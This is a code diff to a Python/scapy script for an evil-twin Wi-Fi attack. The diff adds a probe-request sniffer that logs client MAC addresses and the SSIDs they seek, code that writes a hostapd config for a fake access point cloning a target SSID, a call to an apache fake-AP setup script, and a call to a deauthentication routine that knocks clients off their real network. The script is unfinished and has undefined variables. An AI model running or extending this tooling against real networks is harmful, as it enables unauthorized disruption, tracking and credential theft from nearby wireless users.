@@ -1,6 +1,6 @@
 import netifaces
 from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap, Dot11ProbeReq
 
 network_list = {}
 
@@ -26,47 +26,6 @@ def monitorMode(iface):
 
 
 '''
-Handels the packet caught by the interface by seperating it to sender and reciver packets
-'''
-
-
-def packet_handler(pkt):
-    if pkt.haslayer(Dot11Beacon):
-        dot11_layer = pkt[Dot11]
-        if dot11_layer.addr2 and (dot11_layer.addr2 not in network_list.keys()):
-            bssid = pkt[Dot11].info
-            channel = int(ord(pkt[Dot11Elt:3].info))
-            mac = dot11_layer.addr2
-            #new_network = Network(bssid, pkt[Dot11].addr2, channel)
-            #new_duo = {mac: new_network}
-            #network_list.update(new_duo)
-    else:
-        sn = pkt.getlayer(Dot11).addr2
-        rc = pkt.getlayer(Dot11).addr1
-        if sn in network_list.keys():
-            net = network_list.get(sn)
-            if rc not in net.get_users():
-                net.add_user(rc)
-        if rc in network_list.keys():
-            net = network_list.get(rc)
-            if sn not in net.get_users():
-                net.add_user(sn)
-
-
-'''
-sniffs for packets using selected interface
-'''
-
-
-def start_sniffer(interface):
-    os.system("clear")
-    for channel in range(1, 13):
-        print("\U0001F634")
-        os.system("iwconfig %s channel %d" % (interface, channel))
-        sniff(iface=interface, timeout=5, prn=packet_handler)
-
-
-'''
 sends deauth packets to selected user on selected network
 '''
 
@@ -85,6 +44,32 @@ def perform_deauth(router, client, iface):
 
     except Exception as e:
         print(f"error: {e}")
+
+
+# define variables
+clients = {}
+
+
+# our packet handler
+def packet_handler(p):
+    global uni
+    if p.haslayer(Dot11ProbeReq):
+        mac = str(p.addr2)
+        if p.haslayer(Dot11Elt):
+            if p.ID == 0:
+                ssid = p.info
+                if mac not in clients.keys() and ssid != "":
+                    clients[mac] = [ssid]
+                elif mac in clients.keys() and ssid not in clients[mac]:
+                    clients.get(mac).append(ssid)
+                print(f"MAC:{mac} BSSID:{ssid}")
+
+
+def start_sniffer(interface):
+    os.system("clear")
+    for channel in range(1, 13):
+        os.system("iwconfig %s channel %d" % (interface, channel))
+        sniff(iface=interface, timeout=10, prn=packet_handler)
 
 
 if __name__ == '__main__':
@@ -113,15 +98,22 @@ if __name__ == '__main__':
             print("Could not change interface mode to monitor.")
 
     # Sniffs for prob-reqs, display and pick user to attack
+    start_sniffer(user_iface)
 
+
+    # TODO - PICK ONE TARGET - ap bssid
 
     # setup fake ap
-    os.system('hostapd hostapd.conf')
+    apdconf_text = f"interface={user_iface}\n driver=nl80211\nssid={target_ap}\nhw_mode=g\nchannel=11\nmacaddr_acl=0" \
+                   f"\nignore_broadcast_ssid=0\nauth_algs=1\nieee80211n=1\nwme_enabled=1 "
+    text_file = open("hostapd.conf", "w")
+    n = text_file.write(apdconf_text)
+    text_file.close()
 
     # setup apache server
     os.system('sudo ./setupFakeAP.sh')
 
     # deauth user
-
+    perform_deauth()
 
     # send auth to user
